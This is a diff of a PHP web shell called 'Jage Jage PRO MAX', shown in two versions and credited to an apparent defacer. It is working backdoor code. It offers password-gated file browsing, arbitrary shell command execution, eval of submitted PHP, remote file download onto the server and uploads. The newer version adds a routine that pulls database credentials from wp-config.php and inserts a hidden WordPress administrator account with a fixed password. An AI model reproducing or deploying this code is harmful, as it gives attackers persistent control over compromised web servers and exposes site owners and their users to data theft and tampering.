@@ -9,198 +9,211 @@ $hash = '$2a$12$G4k63UyXQx7Xaue0m0G7k.IAq6Po0zZZ/VWg0gORWp8pPfRMKXT1.';
 if (!isset($_SESSION['login'])) {
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
         $_SESSION['login'] = true;
-        header("Location: ?");
-        exit;
+        header("Location: ?"); exit;
     }
-    die('<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px}input{background:#000;color:#0f0;border:1px solid #0f0;padding:8px}button{background:#0f0;color:#000;border:none;padding:8px 15px;cursor:pointer;font-weight:bold}</style><h2>Jage Jage File Manager Shell</h2><form method=post><input type=password name=pass placeholder=password><button>Login</button></form>');
+    die('<style>body{background:black;color:lime;font-family:monospace;text-align:center;padding-top:100px}input{background:black;color:lime;border:1px solid lime;padding:5px}</style><h2>Jage Jage PRO MAX</h2><form method=post><input type=password name=pass placeholder=password><button>Login</button></form>');
 }
 
-$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(".");
-if (!$dir || !is_dir($dir)) $dir = realpath(".");
+if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
+
+$base = realpath(".");
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $base;
+if (!$dir || !is_dir($dir)) $dir = $base;
 chdir($dir);
 
-$msg = "";
+$status = ""; $cmd_out = "";
 
-// --- SYSTEM INFO HELPERS ---
-function get_perms($f) {
-    $p = fileperms($f);
-    if (($p & 0xC000) == 0xC000) $i = 's';
-    elseif (($p & 0xA000) == 0xA000) $i = 'l';
-    elseif (($p & 0x8000) == 0x8000) $i = '-';
-    elseif (($p & 0x6000) == 0x6000) $i = 'b';
-    elseif (($p & 0x4000) == 0x4000) $i = 'd';
-    elseif (($p & 0x2000) == 0x2000) $i = 'c';
-    elseif (($p & 0x1000) == 0x1000) $i = 'p';
-    else $i = 'u';
-    $i .= (($p & 0x0100) ? 'r' : '-');
-    $i .= (($p & 0x0080) ? 'w' : '-');
-    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
-    $i .= (($p & 0x0020) ? 'r' : '-');
-    $i .= (($p & 0x0010) ? 'w' : '-');
-    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
-    $i .= (($p & 0x0004) ? 'r' : '-');
-    $i .= (($p & 0x0002) ? 'w' : '-');
-    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
-    return $i;
+// --- ACTIONS LOGIC ---
+if (isset($_FILES['f'])) { if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) $status = "Upload Success! 😝"; }
+if (isset($_GET['del'])) { @unlink($_GET['del']); header("Location: ?dir=".urlencode($dir)); }
+if (isset($_POST['rename'])) { @rename($_POST['old'], $_POST['new']); }
+if (isset($_POST['save'])) { file_put_contents($_POST['file'], $_POST['content']); $status = "Saved! 😝"; }
+
+// MASS DELETE
+if (isset($_POST['mass_delete']) && !empty($_POST['files'])) {
+    foreach ($_POST['files'] as $f) { is_dir($f) ? @rmdir($f) : @unlink($f); }
+    $status = "Mass Delete Success! 😝";
 }
 
-// --- LOGIC ACTIONS ---
-if (isset($_GET['paste_all']) && isset($_SESSION['clipboard'])) {
-    foreach ($_SESSION['clipboard'] as $src) {
-        if (file_exists($src)) {
-            $fn = basename($src);
-            $dst = $dir . DIRECTORY_SEPARATOR . $fn;
-            if (file_exists($dst)) {
-                $pi = pathinfo($fn);
-                $dst = $dir.DIRECTORY_SEPARATOR.$pi['filename']." (copy)".(isset($pi['extension']) ? ".".$pi['extension'] : "");
-            }
-            is_dir($src) ? @mkdir($dst) : copy($src, $dst);
-        }
-    }
-    unset($_SESSION['clipboard']);
-    $msg = "Pasted successfully.";
-}
+// REAL WP ADMIN INJECTOR
+if (isset($_POST['add_wp'])) {
+    if (file_exists('wp-config.php')) {
+        $config = file_get_contents('wp-config.php');
+        preg_match("/'DB_NAME',\s*'(.+?)'/", $config, $db_name);
+        preg_match("/'DB_USER',\s*'(.+?)'/", $config, $db_user);
+        preg_match("/'DB_PASSWORD',\s*'(.+?)'/", $config, $db_pass);
+        preg_match("/'DB_HOST',\s*'(.+?)'/", $config, $db_host);
+        preg_match("/\$table_prefix\s*=\s*'(.+?)'/", $config, $db_prefix);
 
-if (isset($_POST['mass_del']) && !empty($_POST['files'])) {
-    foreach ($_POST['files'] as $f) { $t = $dir.DIRECTORY_SEPARATOR.$f; is_dir($t) ? @rmdir($t) : @unlink($t); }
-    $msg = "Deleted selected.";
-}
-
-if (isset($_POST['mass_copy']) && !empty($_POST['files'])) {
-    $_SESSION['clipboard'] = [];
-    foreach ($_POST['files'] as $f) { $_SESSION['clipboard'][] = $dir.DIRECTORY_SEPARATOR.$f; }
-    $msg = count($_SESSION['clipboard'])." items in clipboard.";
+        $conn = mysqli_connect($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);
+        if ($conn) {
+            $prefix = $db_prefix[1];
+            $user = 'jage_admin';
+            $pass = md5('jage123');
+            $mail = 'angel@valhalla.corp';
+            
+            mysqli_query($conn, "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$user', '$pass', '$user', '$mail', NOW(), 0, '$user')");
+            $id = mysqli_insert_id($conn);
+            mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
+            mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$prefix}user_level', '10')");
+            $status = "Sukses! User: jage_admin | Pass: jage123 😝";
+            mysqli_close($conn);
+        } else { $status = "Koneksi DB Gagal! 😝"; }
+    } else { $status = "wp-config.php tidak ada! 😝"; }
 }
 
 if (isset($_POST['rem_up']) && !empty($_POST['url'])) {
-    file_put_contents(basename($_POST['url']), file_get_contents($_POST['url']));
-    $msg = "Remote Upload Success.";
+    if(@file_put_contents(basename($_POST['url']), file_get_contents($_POST['url']))) $status = "Remote Success! 😝";
+}
+if (isset($_POST['exec_php']) && !empty($_POST['php_code'])) {
+    ob_start(); eval('?>'.$_POST['php_code']); $cmd_out = ob_get_contents(); ob_end_clean();
+}
+if (isset($_POST['shell_cmd'])) { $cmd_out = shell_exec($_POST['shell_cmd']." 2>&1"); }
+
+if (isset($_GET['copy'])) { $_SESSION['cp'] = $dir.DIRECTORY_SEPARATOR.$_GET['copy']; $status = "Copied! 😝"; }
+if (isset($_POST['paste']) && isset($_SESSION['cp'])) {
+    $src = $_SESSION['cp']; $info = pathinfo($src);
+    copy($src, $dir.DIRECTORY_SEPARATOR.$info['filename'].'_copy.'.$info['extension']);
+    $status = "Pasted! 😝";
 }
 
-if (isset($_POST['exec_php'])) {
-    ob_start(); eval('?>'.$_POST['php_code']); $php_res = ob_get_contents(); ob_end_clean();
-}
-
-$cmd_res = "";
-if (isset($_POST['cmd'])) {
-    if(function_exists('shell_exec')) $cmd_res = shell_exec($_POST['cmd']);
-    elseif(function_exists('system')) { ob_start(); system($_POST['cmd']); $cmd_res = ob_get_contents(); ob_end_clean(); }
-}
-
-if (isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
+$files = scandir(".");
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Jage Jage PRO MAX v7</title>
+    <title>Jage Jage PRO MAX v31</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: monospace; font-size: 13px; margin: 0; }
-        .nav { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); position: sticky; top: 0; z-index: 100; }
-        .server-info { background: rgba(0,255,0,0.05); padding: 10px; border-bottom: 1px solid #222; font-size: 11px; }
-        .grid { display: flex; flex-wrap: wrap; gap: 10px; padding: 10px; }
-        .box { border: 1px solid #333; padding: 10px; background: #0a0a0a; flex: 1; min-width: 250px; }
-        .terminal { background: #000; border: 1px solid var(--neon); padding: 10px; margin: 10px; border-radius: 5px; }
-        .term-out { color: #888; max-height: 150px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 5px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th { background: var(--neon); color: #000; padding: 10px; text-align: left; }
-        tr { border-bottom: 1px solid #222; }
-        tr:hover { background: rgba(0,255,0,0.05); }
-        td { padding: 10px; }
-        .btn { background: var(--neon); color: #000; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; }
-        .btn:hover { box-shadow: 0 0 10px var(--neon); }
-        .btn-red { background: #ff3131; color: #fff; }
-        input, textarea { background: #111; color: var(--neon); border: 1px solid #333; padding: 5px; }
-        a { color: cyan; text-decoration: none; }
-        
-        /* BERKEDIP ANIMATION */
-        @keyframes blink { 0% { opacity: 1; text-shadow: 0 0 10px var(--neon); } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        .coded-by { text-align: center; padding: 30px; font-size: 18px; font-weight: bold; }
-        .coded-by a { color: var(--neon); animation: blink 1s infinite; text-decoration: none; }
+        body { margin:0; background:black; color:#00ff00; font-family:monospace; font-size: 13px; overflow-x: hidden; }
+        canvas { position:fixed; top:0; left:0; z-index:-1; }
+        .topbar { background:rgba(17,17,17,0.9); padding:10px; border-bottom:1px solid #0f0; display: flex; align-items: center; gap: 10px; }
+        .tools-box { background:rgba(0,0,0,0.8); padding:10px; border-bottom:1px solid #333; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        a { color:#0ff; text-decoration:none; }
+        table { width:100%; border-collapse:collapse; background:rgba(0,0,0,0.7); margin-top: 5px; }
+        td, th { padding:8px; border-bottom:1px solid #222; text-align: left; }
+        tr:hover { background:rgba(0,255,0,0.1); }
+        .btn { color:black; background:#0f0; padding:3px 8px; border:none; cursor:pointer; font-family:monospace; font-weight:bold; font-size: 11px; }
+        .inp { background:black; color:lime; border:1px solid #0f0; padding:3px; font-family:monospace; font-size:11px; }
+        .footer { text-align:center; padding:20px; color:#555; font-weight:bold; }
+        textarea { width:100%; height:400px; background:black; color:lime; border:1px solid #0f0; }
+        .out-box { background:#000; border:1px solid #0f0; color:#fff; padding:10px; margin:10px; font-size:11px; white-space:pre-wrap; }
     </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
 
-<div class="nav">
-    <strong>PATH:</strong> <span style="color:#aaa;"><?= $dir ?></span> | 
-    <a href="?dir=<?= urlencode(realpath(".")) ?>">🏠 HOME</a> | 
-    <?php if(isset($_SESSION['clipboard'])): ?>
-        <a href="?paste_all=1&dir=<?= urlencode($dir) ?>" style="color:yellow;">📋 PASTE ALL (<?= count($_SESSION['clipboard']) ?>)</a> |
+<div class="topbar">
+    <div style="display: flex; gap: 5px;">
+        <a href="?dir=<?= urlencode($base) ?>" class="btn">HOME</a> 
+        <a href="?logout" class="btn" style="background:red;color:white;">LOGOUT</a>
+    </div>
+    <span style="color:#555;">|</span>
+    <div style="flex: 1;">
+        <?php
+        $current_path = getcwd(); $parts = explode(DIRECTORY_SEPARATOR, $current_path); $build_path = "";
+        foreach ($parts as $p) {
+            if ($p == "") { echo "<a href='?dir=/'>/</a>"; $build_path = "/"; continue; }
+            $build_path .= ($build_path == "/" ? "" : DIRECTORY_SEPARATOR) . $p;
+            echo " <a href='?dir=" . urlencode($build_path) . "'>$p</a> /";
+        }
+        ?>
+    </div>
+</div>
+
+<div class="tools-box">
+    <form method="post" enctype="multipart/form-data" style="display:flex; align-items:center; gap:5px;">
+        <span>Upload:</span> <input type="file" name="f" class="inp" style="width:130px;"> <button class="btn">GO</button>
+    </form>
+    |
+    <form method="post" style="display:flex; align-items:center; gap:5px;">
+        <span>Remote:</span> <input type="text" name="url" placeholder="URL" class="inp" style="width:100px;"> <button name="rem_up" class="btn">GET</button>
+    </form>
+    |
+    <form method="post" style="display:flex; align-items:center; gap:5px;">
+        <span>PHP:</span> <input type="text" name="php_code" placeholder="Code" class="inp" style="width:70px;"> <button name="exec_php" class="btn">RUN</button>
+    </form>
+    |
+    <form method="post" style="display:inline;">
+        <button name="add_wp" class="btn" style="background:#21759b; color:white;">ADD WP ADMIN</button>
+    </form>
+    |
+    <button type="submit" form="mass_form" name="mass_delete" class="btn" style="background:red;color:white;" onclick="return confirm('Hapus yang dipilih?')">DELETE SELECTED</button>
+    <?php if(isset($_SESSION['cp'])): ?>
+    | <form method="post" style="display:inline;"><button name="paste" class="btn" style="background:cyan;">PASTE</button></form>
     <?php endif; ?>
-    <a href="?logout" style="color:red;">LOGOUT</a>
 </div>
 
-<div class="server-info">
-    <strong>OS:</strong> <?= php_uname(); ?> | 
-    <strong>PHP:</strong> <?= phpversion(); ?> | 
-    <strong>USER:</strong> <?= get_current_user(); ?> (<?= getmyuid(); ?>) | 
-    <strong>SERVER IP:</strong> <?= $_SERVER['SERVER_ADDR']; ?>
-</div>
-
-<div class="terminal">
-    <div class="term-out"><?= htmlspecialchars($cmd_res) ?></div>
-    <form method="post">
-        <span style="color:var(--neon)">shell@jage:~$</span> 
-        <input type="text" name="cmd" style="width:80%; border:none; outline:none;" placeholder="enter command..." autofocus>
+<div class="tools-box">
+    <form method="post" style="display:flex; width:100%; gap:5px; align-items:center;">
+        <span>Terminal:</span> <input type="text" name="shell_cmd" placeholder="Command..." class="inp" style="flex:1;"> 
+        <button class="btn">EXECUTE</button>
     </form>
 </div>
 
-<div class="grid">
-    <div class="box">
-        <strong>REMOTE UPLOAD</strong>
-        <form method="post"><input type="text" name="url" placeholder="URL" style="width:60%"><button class="btn">GET</button></form>
-    </div>
-    <div class="box">
-        <strong>PHP EXEC</strong>
-        <form method="post"><textarea name="php_code" style="width:70%; height:30px;"></textarea><button class="btn" name="exec_php">RUN</button></form>
-        <div style="font-size:10px;"><?= $php_res ?></div>
-    </div>
-    <div class="box">
-        <strong>WP TOOLS</strong><br>
-        <form method="post"><button class="btn" name="wp_admin">ADD ADMIN</button></form>
-    </div>
-</div>
+<?php if($cmd_out): ?><div class="out-box"><b>Console Output:</b><br><?= htmlspecialchars($cmd_out) ?></div><?php endif; ?>
+<?php if($status): ?><div style="background:lime; color:black; padding:5px; text-align:center; font-weight:bold;"><?= $status ?></div><?php endif; ?>
 
-<div style="padding: 10px;">
-    <form method="post" enctype="multipart/form-data" style="margin-bottom:15px;">
-        <input type="file" name="f"> <button class="btn">UPLOAD</button>
-        <span style="color:yellow; margin-left:15px;"><?= $msg ?></span>
-    </form>
+<?php if (isset($_GET['edit'])): 
+    $file = $_GET['edit']; $content = htmlspecialchars(file_get_contents($file)); ?>
+    <div style='padding:15px;'><h3>Edit: <?= basename($file) ?></h3>
+    <form method=post><input type=hidden name=file value='<?= $file ?>'><textarea name=content><?= $content ?></textarea>
+    <br><button name=save class='btn' style='margin-top:10px;'>SAVE</button> <a href='?dir=<?= urlencode($dir) ?>' style='color:red;'>[Cancel]</a></form></div>
+<?php else: ?>
 
-    <form method="post">
-        <div style="margin-bottom:10px;">
-            <button class="btn" name="mass_copy">COPY SELECTED</button>
-            <button class="btn btn-red" name="mass_del" onclick="return confirm('Hapus?')">DELETE SELECTED</button>
-        </div>
+<form id="mass_form" method="post">
+<table>
+    <tr style="background:#111;">
+        <th width="20"><input type="checkbox" onclick="for(c of document.getElementsByName('files[]')) c.checked=this.checked"></th>
+        <th>Name</th>
+        <th width="100">Size</th>
+        <th width="400">Action</th>
+    </tr>
+    <?php foreach ($files as $f): if($f == "." || $f == "..") continue; ?>
+    <tr>
+        <td><input type="checkbox" name="files[]" value="<?= htmlspecialchars($f) ?>"></td>
+        <td><?= is_dir($f) ? "📁" : "📄" ?> <a href="<?= is_dir($f) ? "?dir=".urlencode(realpath($f)) : "#" ?>"><?= $f ?></a></td>
+        <td style="font-size:11px;"><?= is_file($f) ? number_format(filesize($f)/1024, 2)." KB" : "-" ?></td>
+        <td>
+            <?php if (is_file($f)): ?>
+                <a href="?edit=<?= $f ?>&dir=<?= urlencode($dir) ?>">[Edit]</a> |
+                <a href="?copy=<?= $f ?>&dir=<?= urlencode($dir) ?>">[Copy]</a> |
+                <a href="?dir=<?= urlencode($dir) ?>&del=<?= $f ?>" onclick="return confirm('Hapus?')">[Del]</a> |
+                <a href="<?= $f ?>" download>[DL]</a>
+                <div style="display:inline; margin-left:5px;">
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="old" value="<?= $f ?>">
+                        <input name="new" value="<?= $f ?>" class="inp" style="width:70px;">
+                        <button name="rename" class="btn" style="padding:1px 3px; font-size:10px;">Ren</button>
+                    </form>
+                </div>
+            <?php endif; ?>
+        </td>
+    </tr>
+    <?php endforeach; ?>
+</table>
+</form>
+<?php endif; ?>
 
-        <table>
-            <thead>
-                <tr>
-                    <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('files[]')) c.checked=this.checked"></th>
-                    <th>Name</th>
-                    <th>Size</th>
-                    <th>Perms</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody>
-                <?php foreach(scandir($dir) as $f): if($f=="." || $f=="..") continue; $p = $dir.DIRECTORY_SEPARATOR.$f; ?>
-                <tr>
-                    <td><input type="checkbox" name="files[]" value="<?= htmlspecialchars($f) ?>"></td>
-                    <td><?= is_dir($f) ? "📁" : "📄" ?> <a href="<?= is_dir($f) ? "?dir=".urlencode($p) : "#" ?>"><?= $f ?></a></td>
-                    <td><?= is_file($f) ? number_format(filesize($f)/1024, 2)." KB" : "[DIR]" ?></td>
-                    <td><span style="color:<?= is_writable($f) ? 'lime' : 'red' ?>;"><?= get_perms($p) ?></span></td>
-                    <td><?php if(is_file($f)): ?><a href="?edit=<?= urlencode($f) ?>&dir=<?= urlencode($dir) ?>">📝</a><?php endif; ?></td>
-                </tr>
-                <?php endforeach; ?>
-            </tbody>
-        </table>
-    </form>
-</div>
+<div class="footer">coded by ./sTory An9el</div>
 
-<div class="coded-by">
-    Coded By <a href="https://jagego.blogspot.com/" target="_blank">./sTory An9el</a>
-</div>
-
+<script>
+var c = document.getElementById("matrix"); var ctx = c.getContext("2d");
+c.height = window.innerHeight; c.width = window.innerWidth;
+var letters = "01"; letters = letters.split("");
+var fontSize = 14; var columns = c.width/fontSize;
+var drops = []; for(var x=0;x<columns;x++) drops[x]=1;
+function draw(){
+    ctx.fillStyle="rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle="#0F0"; ctx.font=fontSize+"px monospace";
+    for(var i=0;i<drops.length;i++){
+        var text=letters[Math.floor(Math.random()*letters.length)];
+        ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+        if(drops[i]*fontSize>c.height && Math.random()>0.975) drops[i]=0;
+        drops[i]++;
+    }
+}
+setInterval(draw,33);
+window.onresize = function(){ c.height = window.innerHeight; c.width = window.innerWidth; columns = c.width/fontSize; };
+</script>
 </body>
 </html>
